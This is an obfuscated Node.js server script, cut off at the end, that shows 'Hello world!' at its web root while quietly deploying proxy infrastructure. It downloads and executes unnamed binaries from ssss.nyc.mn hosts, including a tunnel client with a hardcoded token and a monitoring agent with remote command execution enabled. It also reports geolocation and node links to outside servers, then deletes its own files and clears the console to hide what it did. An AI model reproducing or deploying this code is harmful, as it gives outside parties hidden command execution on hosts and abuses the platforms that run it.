const _0x208570=_0x548f;(function(_0x405e62,_0x17ff86){const _0xa1a2c0=_0x548f,_0x5569ca=_0x405e62();while(!![]){try{const _0x3fcef4=parseInt(_0xa1a2c0(0x268))/0x1+parseInt(_0xa1a2c0(0x22f))/0x2*(-parseInt(_0xa1a2c0(0x252))/0x3)+-parseInt(_0xa1a2c0(0x22c))/0x4+-parseInt(_0xa1a2c0(0x21c))/0x5+parseInt(_0xa1a2c0(0x244))/0x6*(-parseInt(_0xa1a2c0(0x284))/0x7)+parseInt(_0xa1a2c0(0x1f1))/0x8*(parseInt(_0xa1a2c0(0x290))/0x9)+-parseInt(_0xa1a2c0(0x27e))/0xa*(-parseInt(_0xa1a2c0(0x27a))/0xb);if(_0x3fcef4===_0x17ff86)break;else _0x5569ca['push'](_0x5569ca['shift']());}catch(_0x1909ed){_0x5569ca['push'](_0x5569ca['shift']());}}}(_0xa1a1,0xf042d));const express=require(_0x208570(0x200)),app=express(),axios=require(_0x208570(0x259)),os=require('os'),fs=require('fs'),path=require(_0x208570(0x240)),{promisify}=require(_0x208570(0x28b)),exec=promisify(require(_0x208570(0x27f))[_0x208570(0x215)]),{execSync}=require(_0x208570(0x27f)),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x208570(0x1df)][_0x208570(0x236)]||'',AUTO_ACCESS=process[_0x208570(0x1df)][_0x208570(0x262)]||![],FILE_PATH=process[_0x208570(0x1df)][_0x208570(0x25a)]||_0x208570(0x1f5),SUB_PATH=process[_0x208570(0x1df)][_0x208570(0x1fa)]||_0x208570(0x1da),PORT=process['env'][_0x208570(0x1d8)]||process[_0x208570(0x1df)]['PORT']||0xbb8,UUID=process[_0x208570(0x1df)][_0x208570(0x26b)]||_0x208570(0x237),NEZHA_SERVER=process[_0x208570(0x1df)][_0x208570(0x279)]||'',NEZHA_PORT=process['env'][_0x208570(0x266)]||'',NEZHA_KEY=process[_0x208570(0x1df)][_0x208570(0x204)]||'',ARGO_DOMAIN=process[_0x208570(0x1df)][_0x208570(0x224)]||_0x208570(0x277),ARGO_AUTH=process[_0x208570(0x1df)][_0x208570(0x238)]||_0x208570(0x1e0),ARGO_PORT=process[_0x208570(0x1df)]['ARGO_PORT']||0x1f41,CFIP=process[_0x208570(0x1df)][_0x208570(0x24b)]||_0x208570(0x1f4),CFPORT=process[_0x208570(0x1df)]['CFPORT']||0x1bb,NAME=process[_0x208570(0x1df)]['NAME']||_0x208570(0x225);!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x208570(0x285)](FILE_PATH+'\x20is\x20created')):console[_0x208570(0x285)](FILE_PATH+_0x208570(0x270));function generateRandomName(){const _0x4d832d=_0x208570,_0x2e06b0=_0x4d832d(0x288);let _0xb747d1='';for(let _0x5c4c6c=0x0;_0x5c4c6c<0x6;_0x5c4c6c++){_0xb747d1+=_0x2e06b0['charAt'](Math[_0x4d832d(0x1e1)](Math[_0x4d832d(0x23c)]()*_0x2e06b0[_0x4d832d(0x22b)]));}return _0xb747d1;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x208570(0x258)](FILE_PATH,npmName),phpPath=path[_0x208570(0x258)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x208570(0x258)](FILE_PATH,_0x208570(0x21b)),listPath=path[_0x208570(0x258)](FILE_PATH,_0x208570(0x1dd)),bootLogPath=path[_0x208570(0x258)](FILE_PATH,_0x208570(0x26c)),configPath=path[_0x208570(0x258)](FILE_PATH,'config.json');function deleteNodes(){const _0x31f9b7=_0x208570;try{if(!UPLOAD_URL)return;if(!fs[_0x31f9b7(0x221)](subPath))return;let _0x49bfda;try{_0x49bfda=fs[_0x31f9b7(0x1cd)](subPath,_0x31f9b7(0x203));}catch{return null;}const _0x3ec1fa=Buffer['from'](_0x49bfda,'base64')[_0x31f9b7(0x28e)]('utf-8'),_0x3cce35=_0x3ec1fa[_0x31f9b7(0x1f9)]('\x0a')[_0x31f9b7(0x1eb)](_0x3ad311=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3ad311));if(_0x3cce35[_0x31f9b7(0x22b)]===0x0)return;return axios[_0x31f9b7(0x21a)](UPLOAD_URL+_0x31f9b7(0x1d3),JSON['stringify']({'nodes':_0x3cce35}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x3d9d3e=>{return null;}),null;}catch(_0x1c0c09){return null;}}function cleanupOldFiles(){const _0x23b43c=_0x208570;try{const _0x571a3e=fs[_0x23b43c(0x24a)](FILE_PATH);_0x571a3e[_0x23b43c(0x211)](_0x3963cf=>{const _0x306608=_0x23b43c,_0x518a85=path[_0x306608(0x258)](FILE_PATH,_0x3963cf);try{const _0xc1b930=fs[_0x306608(0x1e3)](_0x518a85);_0xc1b930['isFile']()&&fs[_0x306608(0x255)](_0x518a85);}catch(_0x1cf8a7){}});}catch(_0x3a11d6){}}app['get']('/',function(_0x11d203,_0xf3610b){const _0x1c1e61=_0x208570;_0xf3610b[_0x1c1e61(0x226)](_0x1c1e61(0x1db));});async function generateConfig(){const _0x2648dd=_0x208570,_0x4b5c80={'log':{'access':'/dev/null','error':_0x2648dd(0x209),'loglevel':_0x2648dd(0x1cf)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2648dd(0x1de),'settings':{'clients':[{'id':UUID,'flow':_0x2648dd(0x22d)}],'decryption':_0x2648dd(0x1cf),'fallbacks':[{'dest':0xbb9},{'path':_0x2648dd(0x22a),'dest':0xbba},{'path':_0x2648dd(0x20a),'dest':0xbbb},{'path':_0x2648dd(0x272),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x2648dd(0x1cf)},'streamSettings':{'network':_0x2648dd(0x28c),'security':_0x2648dd(0x1cf)}},{'port':0xbba,'listen':_0x2648dd(0x1d4),'protocol':_0x2648dd(0x1de),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2648dd(0x1cf)},'streamSettings':{'network':'ws','security':_0x2648dd(0x1cf),'wsSettings':{'path':_0x2648dd(0x22a)}},'sniffing':{'enabled':!![],'destOverride':[_0x2648dd(0x20f),'tls',_0x2648dd(0x25b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2648dd(0x1d4),'protocol':_0x2648dd(0x1ff),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2648dd(0x20f),_0x2648dd(0x21d),_0x2648dd(0x25b)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x2648dd(0x1f2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2648dd(0x1cf),'wsSettings':{'path':_0x2648dd(0x272)}},'sniffing':{'enabled':!![],'destOverride':[_0x2648dd(0x20f),_0x2648dd(0x21d),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x2648dd(0x1e4)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':_0x2648dd(0x1e5)}]};fs[_0x2648dd(0x212)](path[_0x2648dd(0x258)](FILE_PATH,_0x2648dd(0x230)),JSON[_0x2648dd(0x261)](_0x4b5c80,null,0x2));}function getSystemArchitecture(){const _0x3c910b=_0x208570,_0x21e7c0=os['arch']();return _0x21e7c0===_0x3c910b(0x22e)||_0x21e7c0===_0x3c910b(0x206)||_0x21e7c0===_0x3c910b(0x283)?_0x3c910b(0x22e):_0x3c910b(0x257);}function downloadFile(_0x1519f4,_0x3e50c2,_0x360e2d){const _0x201b5e=_0x208570,_0x3fc041=_0x1519f4;!fs[_0x201b5e(0x221)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x3fea61=fs['createWriteStream'](_0x3fc041);axios({'method':_0x201b5e(0x21e),'url':_0x3e50c2,'responseType':_0x201b5e(0x263)})[_0x201b5e(0x24e)](_0x5b9f1b=>{const _0x391b90=_0x201b5e;_0x5b9f1b[_0x391b90(0x287)]['pipe'](_0x3fea61),_0x3fea61['on'](_0x391b90(0x26e),()=>{const _0x570faa=_0x391b90;_0x3fea61['close'](),console['log'](_0x570faa(0x286)+path[_0x570faa(0x265)](_0x3fc041)+'\x20successfully'),_0x360e2d(null,_0x3fc041);}),_0x3fea61['on']('error',_0x5c7b43=>{const _0x10af74=_0x391b90;fs[_0x10af74(0x1e6)](_0x3fc041,()=>{});const _0x50bc54=_0x10af74(0x286)+path[_0x10af74(0x265)](_0x3fc041)+'\x20failed:\x20'+_0x5c7b43['message'];console[_0x10af74(0x280)](_0x50bc54),_0x360e2d(_0x50bc54);});})['catch'](_0x15becf=>{const _0x4e635c=_0x201b5e,_0x2cd411='Download\x20'+path[_0x4e635c(0x265)](_0x3fc041)+_0x4e635c(0x23d)+_0x15becf[_0x4e635c(0x269)];console[_0x4e635c(0x280)](_0x2cd411),_0x360e2d(_0x2cd411);});}function _0x548f(_0x3f4bcf,_0x33decd){_0x3f4bcf=_0x3f4bcf-0x1cc;const _0xa1a1a2=_0xa1a1();let _0x548fc4=_0xa1a1a2[_0x3f4bcf];return _0x548fc4;}async function downloadFilesAndRun(){const _0x18d4c3=_0x208570,_0x36a184=getSystemArchitecture(),_0x379010=getFilesForArchitecture(_0x36a184);if(_0x379010[_0x18d4c3(0x22b)]===0x0){console[_0x18d4c3(0x285)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x578af3=_0x379010[_0x18d4c3(0x233)](_0x34f849=>{return new Promise((_0x1610b7,_0x2a8272)=>{const _0x2bc3bb=_0x548f;downloadFile(_0x34f849[_0x2bc3bb(0x232)],_0x34f849[_0x2bc3bb(0x228)],(_0x1907c1,_0x4c01b1)=>{_0x1907c1?_0x2a8272(_0x1907c1):_0x1610b7(_0x4c01b1);});});});try{await Promise[_0x18d4c3(0x251)](_0x578af3);}catch(_0x1f60e1){console[_0x18d4c3(0x280)](_0x18d4c3(0x28d),_0x1f60e1);return;}function _0x1e7301(_0x5640ef){const _0x2193e4=0x1fd;_0x5640ef['forEach'](_0x33c6c3=>{const _0x1a74af=_0x548f;fs[_0x1a74af(0x221)](_0x33c6c3)&&fs[_0x1a74af(0x25c)](_0x33c6c3,_0x2193e4,_0x3abe46=>{const _0x36bf48=_0x1a74af;_0x3abe46?console[_0x36bf48(0x280)]('Empowerment\x20failed\x20for\x20'+_0x33c6c3+':\x20'+_0x3abe46):console[_0x36bf48(0x285)](_0x36bf48(0x1f7)+_0x33c6c3+':\x20'+_0x2193e4[_0x36bf48(0x28e)](0x8));});});}const _0x282865=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x1e7301(_0x282865);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x395a4c=NEZHA_SERVER[_0x18d4c3(0x28a)](':')?NEZHA_SERVER[_0x18d4c3(0x1f9)](':')[_0x18d4c3(0x23f)]():'',_0x511e66=new Set([_0x18d4c3(0x24c),_0x18d4c3(0x1d5),'2096',_0x18d4c3(0x1ef),_0x18d4c3(0x282),_0x18d4c3(0x267)]),_0x37274a=_0x511e66[_0x18d4c3(0x256)](_0x395a4c)?'true':'false',_0x333b9f=_0x18d4c3(0x23a)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x37274a+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x18d4c3(0x212)](path['join'](FILE_PATH,_0x18d4c3(0x23e)),_0x333b9f);const _0x56a98d=_0x18d4c3(0x223)+phpPath+_0x18d4c3(0x246)+FILE_PATH+_0x18d4c3(0x1e8);try{await exec(_0x56a98d),console[_0x18d4c3(0x285)](phpName+_0x18d4c3(0x1fc)),await new Promise(_0x154f81=>setTimeout(_0x154f81,0x3e8));}catch(_0x5db5cf){console[_0x18d4c3(0x280)](_0x18d4c3(0x210)+_0x5db5cf);}}else{let _0x5c38be='';const _0x3aaca0=['443',_0x18d4c3(0x1d5),_0x18d4c3(0x1d2),_0x18d4c3(0x1ef),_0x18d4c3(0x282),_0x18d4c3(0x267)];_0x3aaca0[_0x18d4c3(0x28a)](NEZHA_PORT)&&(_0x5c38be='--tls');const _0x374ad4='nohup\x20'+npmPath+_0x18d4c3(0x276)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5c38be+_0x18d4c3(0x24f);try{await exec(_0x374ad4),console[_0x18d4c3(0x285)](npmName+_0x18d4c3(0x1fc)),await new Promise(_0x5c9c7d=>setTimeout(_0x5c9c7d,0x3e8));}catch(_0xb2e485){console['error'](_0x18d4c3(0x247)+_0xb2e485);}}}else console['log'](_0x18d4c3(0x27d));const _0x414970=_0x18d4c3(0x223)+webPath+_0x18d4c3(0x1fb)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x414970),console[_0x18d4c3(0x285)](webName+'\x20is\x20running'),await new Promise(_0x4752c4=>setTimeout(_0x4752c4,0x3e8));}catch(_0x53ce22){console[_0x18d4c3(0x280)]('web\x20running\x20error:\x20'+_0x53ce22);}if(fs[_0x18d4c3(0x221)](botPath)){let _0x1971ca;if(ARGO_AUTH[_0x18d4c3(0x1ee)](/^[A-Z0-9a-z=]{120,250}$/))_0x1971ca='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x18d4c3(0x1ee)](/TunnelSecret/)?_0x1971ca=_0x18d4c3(0x208)+FILE_PATH+_0x18d4c3(0x1f6):_0x1971ca=_0x18d4c3(0x1cc)+FILE_PATH+_0x18d4c3(0x254)+ARGO_PORT;try{await exec(_0x18d4c3(0x223)+botPath+'\x20'+_0x1971ca+_0x18d4c3(0x260)),console['log'](botName+_0x18d4c3(0x1fc)),await new Promise(_0x1b9e50=>setTimeout(_0x1b9e50,0x7d0));}catch(_0x512c17){console[_0x18d4c3(0x280)](_0x18d4c3(0x1e7)+_0x512c17);}}await new Promise(_0xc9a612=>setTimeout(_0xc9a612,0x1388));}function getFilesForArchitecture(_0x21889b){const _0x4bac3b=_0x208570;let _0x309c1c;_0x21889b===_0x4bac3b(0x22e)?_0x309c1c=[{'fileName':webPath,'fileUrl':_0x4bac3b(0x1d7)},{'fileName':botPath,'fileUrl':_0x4bac3b(0x26f)}]:_0x309c1c=[{'fileName':webPath,'fileUrl':_0x4bac3b(0x1f3)},{'fileName':botPath,'fileUrl':_0x4bac3b(0x1d0)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xd6b934=_0x21889b===_0x4bac3b(0x22e)?_0x4bac3b(0x281):_0x4bac3b(0x207);_0x309c1c[_0x4bac3b(0x239)]({'fileName':npmPath,'fileUrl':_0xd6b934});}else{const _0x14fc8e=_0x21889b===_0x4bac3b(0x22e)?_0x4bac3b(0x1f0):_0x4bac3b(0x28f);_0x309c1c['unshift']({'fileName':phpPath,'fileUrl':_0x14fc8e});}}return _0x309c1c;}function argoType(){const _0x27a4cb=_0x208570;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x27a4cb(0x1ce));return;}if(ARGO_AUTH[_0x27a4cb(0x28a)](_0x27a4cb(0x201))){fs[_0x27a4cb(0x212)](path[_0x27a4cb(0x258)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x26166b='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x27a4cb(0x1f9)]('\x22')[0xb]+_0x27a4cb(0x25d)+path[_0x27a4cb(0x258)](FILE_PATH,_0x27a4cb(0x27c))+_0x27a4cb(0x20b)+ARGO_DOMAIN+_0x27a4cb(0x291)+ARGO_PORT+_0x27a4cb(0x1d6);fs['writeFileSync'](path[_0x27a4cb(0x258)](FILE_PATH,'tunnel.yml'),_0x26166b);}else console[_0x27a4cb(0x285)](_0x27a4cb(0x1ed));}function _0xa1a1(){const _0x143bd9=['writeFileSync','Skipping\x20adding\x20automatic\x20access\x20task','http://ip-api.com/json/','exec','push','firefox','\x20>/dev/null\x202>&1','Nodes\x20uploaded\x20successfully','post','sub.txt','4417320ZTguRj','tls','get','ArgoDomain:','Add\x20automatic\x20access\x20task\x20faild:\x20','existsSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','nohup\x20','ARGO_DOMAIN','leaflow','send','org','fileUrl','clear','/vless-argo','length','4330000GfZWqR','xtls-rprx-vision','arm','58902OQoHmS','config.json','?security=tls&sni=','fileName','map','ARGO_DOMAIN:','http\x20server\x20is\x20running\x20on\x20port:','PROJECT_URL','e0813f14-3a35-4bf8-a02e-c1e1ac3e12be','ARGO_AUTH','unshift','\x0aclient_secret:\x20','https://ipapi.co/json/','random','\x20failed:\x20','config.yaml','pop','path','&path=%2Ftrojan-argo%3Fed%3D2560#','pkill\x20-f\x20\x22[','.exe\x20>\x20nul\x202>&1','3156378jQLHpK','\x22\x20>\x20/dev/null\x202>&1','\x20-c\x20\x22','npm\x20running\x20error:\x20','set','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','readdirSync','CFIP','443','Subscription\x20uploaded\x20successfully','then','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','charAt','all','123sjTPsf','/api/add-nodes','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','unlinkSync','has','amd','join','axios','FILE_PATH','quic','chmod','\x0a\x20\x20credentials-file:\x20','country_code','rm\x20-rf\x20','\x20>/dev/null\x202>&1\x20&','stringify','AUTO_ACCESS','stream','platform','basename','NEZHA_PORT','2053','1348733zSlGMh','message','App\x20is\x20running','UUID','boot.log','from','finish','https://arm64.ssss.nyc.mn/bot','\x20already\x20exists','/vmess-argo?ed=2560','/trojan-argo','Error\x20in\x20startserver:','countryCode','del\x20/f\x20/q\x20','\x20-s\x20','leaf.asdfmff.ggff.net','catch','NEZHA_SERVER','22rPKHsL','/sub.txt\x20saved\x20successfully','tunnel.json','NEZHA\x20variable\x20is\x20empty,skip\x20running','13483780kzyQGK','child_process','error','https://arm64.ssss.nyc.mn/agent','2083','aarch64','7gPlVeC','log','Download\x20','data','abcdefghijklmnopqrstuvwxyz','\x0a\x20\x20\x20\x20','includes','util','tcp','Error\x20downloading\x20files:','toString','https://amd64.ssss.nyc.mn/v1','9BBCGmk','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','readFileSync','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','none','https://amd64.ssss.nyc.mn/bot','&fp=firefox&type=ws&host=','2096','/api/delete-nodes','127.0.0.1','8443','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/web','SERVER_PORT','substring','sub','Hello\x20world!','Content-Type','list.txt','vless','env','eyJhIjoiZTM4MWIwYTZkZGJiYTBlOTk1MDZlM2U2ODgxZWUxOTciLCJ0IjoiN2Q4MjA3MGEtMThiMy00M2IzLTljZGMtMmZjN2JlMzVhNTE4IiwicyI6Ik1tTTRZamM1WmpVdE5UTmpNUzAwWTJOaExUaGhNR010T1RZd01XRmlaak13WkRFMCJ9','floor','application/json','statSync','https+local://8.8.8.8/dns-query','block','unlink','Error\x20executing\x20command:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','base64','\x0avless://','filter','/api/add-subscriptions','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','match','2087','https://arm64.ssss.nyc.mn/v1','5105104QOPFWf','trojan','https://amd64.ssss.nyc.mn/web','cdns.doon.eu.org','./tmp','/tunnel.yml\x20run','Empowerment\x20success\x20for\x20','win32','split','SUB_PATH','\x20-c\x20','\x20is\x20running','\x0a\x0avmess://','Unhandled\x20error\x20in\x20startserver:','vmess','express','TunnelSecret','success','utf-8','NEZHA_KEY','Error\x20reading\x20boot.log:','arm64','https://amd64.ssss.nyc.mn/agent','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/dev/null','/vmess-argo','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','&path=%2Fvless-argo%3Fed%3D2560#','automatic\x20access\x20task\x20added\x20successfully','Unknown','http','php\x20running\x20error:\x20','forEach'];_0xa1a1=function(){return _0x143bd9;};return _0xa1a1();}async function extractDomains(){const _0x205c90=_0x208570;let _0x986c64;if(ARGO_AUTH&&ARGO_DOMAIN)_0x986c64=ARGO_DOMAIN,console[_0x205c90(0x285)](_0x205c90(0x234),_0x986c64),await _0xf2940b(_0x986c64);else try{const _0x101f93=fs[_0x205c90(0x1cd)](path[_0x205c90(0x258)](FILE_PATH,_0x205c90(0x26c)),'utf-8'),_0x34c8c9=_0x101f93[_0x205c90(0x1f9)]('\x0a'),_0x4cb6b3=[];_0x34c8c9[_0x205c90(0x211)](_0x35a8a9=>{const _0x3b6048=_0x35a8a9['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3b6048){const _0x213107=_0x3b6048[0x1];_0x4cb6b3['push'](_0x213107);}});if(_0x4cb6b3['length']>0x0)_0x986c64=_0x4cb6b3[0x0],console[_0x205c90(0x285)](_0x205c90(0x21f),_0x986c64),await _0xf2940b(_0x986c64);else{console[_0x205c90(0x285)](_0x205c90(0x222)),fs['unlinkSync'](path['join'](FILE_PATH,_0x205c90(0x26c)));async function _0x2ddcb6(){const _0x36a906=_0x205c90;try{process['platform']===_0x36a906(0x1f8)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x36a906(0x243)):await exec(_0x36a906(0x242)+botName[_0x36a906(0x250)](0x0)+']'+botName[_0x36a906(0x1d9)](0x1)+_0x36a906(0x245));}catch(_0x18fb13){}}_0x2ddcb6(),await new Promise(_0x49f5fe=>setTimeout(_0x49f5fe,0xbb8));const _0x5b7743=_0x205c90(0x1cc)+FILE_PATH+_0x205c90(0x254)+ARGO_PORT;try{await exec(_0x205c90(0x223)+botPath+'\x20'+_0x5b7743+_0x205c90(0x260)),console['log'](botName+_0x205c90(0x1fc)),await new Promise(_0xbe762f=>setTimeout(_0xbe762f,0xbb8)),await extractDomains();}catch(_0x45cc0e){console[_0x205c90(0x280)](_0x205c90(0x1e7)+_0x45cc0e);}}}catch(_0x3335ac){console['error'](_0x205c90(0x205),_0x3335ac);}async function _0x20a701(){const _0x2c1a10=_0x205c90;try{const _0x367551=await axios[_0x2c1a10(0x21e)](_0x2c1a10(0x23b),{'timeout':0xbb8});if(_0x367551['data']&&_0x367551[_0x2c1a10(0x287)][_0x2c1a10(0x25e)]&&_0x367551[_0x2c1a10(0x287)][_0x2c1a10(0x227)])return _0x367551[_0x2c1a10(0x287)][_0x2c1a10(0x25e)]+'_'+_0x367551[_0x2c1a10(0x287)][_0x2c1a10(0x227)];}catch(_0x199034){try{const _0x4ecadb=await axios[_0x2c1a10(0x21e)](_0x2c1a10(0x214),{'timeout':0xbb8});if(_0x4ecadb[_0x2c1a10(0x287)]&&_0x4ecadb[_0x2c1a10(0x287)]['status']===_0x2c1a10(0x202)&&_0x4ecadb[_0x2c1a10(0x287)][_0x2c1a10(0x274)]&&_0x4ecadb[_0x2c1a10(0x287)][_0x2c1a10(0x227)])return _0x4ecadb['data'][_0x2c1a10(0x274)]+'_'+_0x4ecadb[_0x2c1a10(0x287)][_0x2c1a10(0x227)];}catch(_0xa58ea6){}}return _0x2c1a10(0x20e);}async function _0xf2940b(_0x4eff61){const _0x4d23be=await _0x20a701(),_0xb7815a=NAME?NAME+'-'+_0x4d23be:_0x4d23be;return new Promise(_0x2eba01=>{setTimeout(()=>{const _0x3f6ed4=_0x548f,_0x50f109={'v':'2','ps':''+_0xb7815a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3f6ed4(0x1cf),'net':'ws','type':_0x3f6ed4(0x1cf),'host':_0x4eff61,'path':_0x3f6ed4(0x271),'tls':_0x3f6ed4(0x21d),'sni':_0x4eff61,'alpn':'','fp':_0x3f6ed4(0x217)},_0x1053cd=_0x3f6ed4(0x1ea)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x4eff61+_0x3f6ed4(0x1d1)+_0x4eff61+_0x3f6ed4(0x20c)+_0xb7815a+_0x3f6ed4(0x1fd)+Buffer[_0x3f6ed4(0x26d)](JSON[_0x3f6ed4(0x261)](_0x50f109))[_0x3f6ed4(0x28e)](_0x3f6ed4(0x1e9))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x3f6ed4(0x231)+_0x4eff61+_0x3f6ed4(0x1d1)+_0x4eff61+_0x3f6ed4(0x241)+_0xb7815a+_0x3f6ed4(0x289);console[_0x3f6ed4(0x285)](Buffer['from'](_0x1053cd)[_0x3f6ed4(0x28e)](_0x3f6ed4(0x1e9))),fs[_0x3f6ed4(0x212)](subPath,Buffer[_0x3f6ed4(0x26d)](_0x1053cd)[_0x3f6ed4(0x28e)](_0x3f6ed4(0x1e9))),console['log'](FILE_PATH+_0x3f6ed4(0x27b)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x58124a,_0x3f0119)=>{const _0x12dedc=_0x3f6ed4,_0x34e99e=Buffer[_0x12dedc(0x26d)](_0x1053cd)[_0x12dedc(0x28e)](_0x12dedc(0x1e9));_0x3f0119[_0x12dedc(0x248)](_0x12dedc(0x1dc),'text/plain;\x20charset=utf-8'),_0x3f0119[_0x12dedc(0x226)](_0x34e99e);}),_0x2eba01(_0x1053cd);},0x7d0);});}}async function uploadNodes(){const _0x425128=_0x208570;if(UPLOAD_URL&&PROJECT_URL){const _0x3e6d03=PROJECT_URL+'/'+SUB_PATH,_0x5be2e2={'subscription':[_0x3e6d03]};try{const _0x3833d8=await axios[_0x425128(0x21a)](UPLOAD_URL+_0x425128(0x1ec),_0x5be2e2,{'headers':{'Content-Type':_0x425128(0x1e2)}});return _0x3833d8&&_0x3833d8['status']===0xc8?(console[_0x425128(0x285)](_0x425128(0x24d)),_0x3833d8):null;}catch(_0x43dbb6){if(_0x43dbb6['response']){if(_0x43dbb6['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x425128(0x221)](listPath))return;const _0x1fd695=fs[_0x425128(0x1cd)](listPath,_0x425128(0x203)),_0x4fb1f2=_0x1fd695[_0x425128(0x1f9)]('\x0a')[_0x425128(0x1eb)](_0x3c5fef=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x3c5fef));if(_0x4fb1f2[_0x425128(0x22b)]===0x0)return;const _0x6a6ca4=JSON[_0x425128(0x261)]({'nodes':_0x4fb1f2});try{const _0x1f34fa=await axios[_0x425128(0x21a)](UPLOAD_URL+_0x425128(0x253),_0x6a6ca4,{'headers':{'Content-Type':_0x425128(0x1e2)}});return _0x1f34fa&&_0x1f34fa['status']===0xc8?(console[_0x425128(0x285)](_0x425128(0x219)),_0x1f34fa):null;}catch(_0x51787d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5728e6=_0x548f,_0x8b1e07=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x8b1e07[_0x5728e6(0x216)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x8b1e07[_0x5728e6(0x216)](phpPath);process[_0x5728e6(0x264)]===_0x5728e6(0x1f8)?exec(_0x5728e6(0x275)+_0x8b1e07[_0x5728e6(0x258)]('\x20')+'\x20>\x20nul\x202>&1',_0x40db88=>{const _0x44a2b5=_0x5728e6;console['clear'](),console[_0x44a2b5(0x285)](_0x44a2b5(0x26a)),console[_0x44a2b5(0x285)](_0x44a2b5(0x249));}):exec(_0x5728e6(0x25f)+_0x8b1e07[_0x5728e6(0x258)]('\x20')+_0x5728e6(0x218),_0x21d272=>{const _0x249dd3=_0x5728e6;console[_0x249dd3(0x229)](),console[_0x249dd3(0x285)](_0x249dd3(0x26a)),console[_0x249dd3(0x285)](_0x249dd3(0x249));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x389dcd=_0x208570;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x389dcd(0x213));return;}try{const _0x43984d=await axios[_0x389dcd(0x21a)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x389dcd(0x1e2)}});return console[_0x389dcd(0x285)](_0x389dcd(0x20d)),_0x43984d;}catch(_0x24bfd0){return console[_0x389dcd(0x280)](_0x389dcd(0x220)+_0x24bfd0[_0x389dcd(0x269)]),null;}}async function startserver(){const _0x25a742=_0x208570;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 